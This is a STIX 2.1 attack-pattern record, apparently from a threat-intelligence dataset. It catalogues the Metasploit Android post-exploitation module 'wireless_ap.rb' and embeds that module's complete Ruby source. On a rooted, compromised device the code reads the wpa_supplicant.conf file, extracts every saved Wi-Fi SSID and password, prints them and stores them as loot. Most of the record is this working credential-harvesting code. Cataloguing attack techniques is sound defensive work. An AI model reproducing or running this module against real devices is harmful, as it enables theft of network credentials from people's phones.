{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--337cc1e7-d673-4861-b27e-e002e8c5a373",
    "created": "2024-08-14T16:33:04.621498Z",
    "modified": "2024-08-14T16:33:04.621503Z",
    "name": "Displays wireless SSIDs and PSKs",
    "description": " This module displays all wireless AP creds saved on the target device.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/android/gather/wireless_ap.rb",
            "external_id": "wireless_ap.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Android::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Displays wireless SSIDs and PSKs',\n          'Description' => %q{\n            This module displays all wireless AP creds saved on the target device.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => ['Auxilus', 'timwr'],\n          'SessionTypes' => [ 'meterpreter', 'shell' ],\n          'Platform' => 'android'\n        }\n      )\n    )\n  end\n\n  def run\n    unless is_root?\n      print_error('This module requires root permissions.')\n      return\n    end\n\n    data = read_file('/data/misc/wifi/wpa_supplicant.conf')\n    aps = parse_wpa_supplicant(data)\n\n    if aps.empty?\n      print_error('No wireless APs found on the device')\n      return\n    end\n    ap_tbl = Rex::Text::Table.new(\n      'Header' => 'Wireless APs',\n      'Indent' => 1,\n      'Columns' => ['SSID', 'net_type', 'password']\n    )\n\n    aps.each do |ap|\n      ap_tbl << [\n        ap[0],  # SSID\n        ap[1],  # TYPE\n        ap[2]   # PASSWORD\n      ]\n    end\n\n    print_line(ap_tbl.to_s)\n    p = store_loot(\n      'wireless.ap.creds',\n      'text/csv',\n      session,\n      ap_tbl.to_csv,\n      File.basename('wireless_ap_credentials.txt')\n    )\n    print_good(\"Secrets stored in: #{p}\")\n  end\n\n  def parse_wpa_supplicant(data)\n    aps = []\n    networks = data.scan(/^network={$(.*?)^}$/m)\n    networks.each do |block|\n      aps << parse_network_block(block[0])\n    end\n    aps\n  end\n\n  def parse_network_block(block)\n    ssid = parse_option(block, 'ssid')\n    type = parse_option(block, 'key_mgmt', false)\n    psk = parse_option(block, 'psk')\n    [ssid, type, psk]\n  end\n\n  def parse_option(block, token, strip_quotes = true)\n    if strip_quotes && ((result = block.match(/^\\s#{token}=\"(.+)\"$/)))\n      return result.captures[0]\n    elsif (result = block.match(/^\\s#{token}=(.+)$/))\n      return result.captures[0]\n    end\n  end\n\nend\n",
    "x_mitre_platforms": [
        "android"
    ]
}